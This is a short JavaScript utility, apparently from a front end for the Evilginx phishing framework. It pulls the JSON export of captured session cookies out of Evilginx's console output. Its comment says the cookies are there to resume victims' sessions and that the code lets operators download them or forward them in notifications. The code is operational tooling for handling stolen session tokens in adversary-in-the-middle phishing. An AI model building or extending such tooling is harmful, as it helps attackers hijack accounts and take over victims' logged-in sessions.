// Evilginx's own `sessions <id>` output embeds a ready-to-use JSON cookie
// export (it recommends importing it via a browser extension to resume the
// captured session) under a "[ cookies ]" heading — pull that out so callers
// can offer copy/download buttons or attach it to a notification instead of
// asking the user to eyeball it out of the raw console text.
export function extractCookies(raw) {
  const match = raw.match(/\[ cookies \]\s*\n(\[.*\])/);
  if (!match) return null;
  try {
    return JSON.parse(match[1]);
  } catch {
    return null;
  }
}
